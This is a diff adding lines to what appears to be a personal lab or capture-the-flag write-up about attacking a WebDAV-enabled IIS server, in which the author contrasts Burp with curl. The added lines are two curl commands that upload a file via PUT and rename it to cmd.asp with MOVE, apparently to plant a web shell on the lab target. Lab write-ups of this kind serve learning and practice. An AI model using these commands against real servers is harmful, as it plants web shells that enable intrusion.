@@ -61,6 +61,11 @@ Given time requirements these day to learn and practice everything. I peaked at 
 
 Went to peak once more [IT Security labs](https://www.youtube.com/watch?v=7l4KgYsBNyM), he use curl not burp. [ASP is not ASPX](https://stackoverflow.com/questions/4462559/difference-between-asp-and-aspx-pages), but I still tested with both. So maybe I made a type in burp or use the boundary on the request with it and screwed with how the raw data is uploaded.
 
+```bash
+curl http://10.129.95.234/ -X PUT -T cmd.txt
+curl http://10.129.95.234/cmd.txt -X MOVE -H "Destination: http://10.129.95.234/cmd.asp"
+```
+
 ![](wtf.png)
 
 It is still slow.
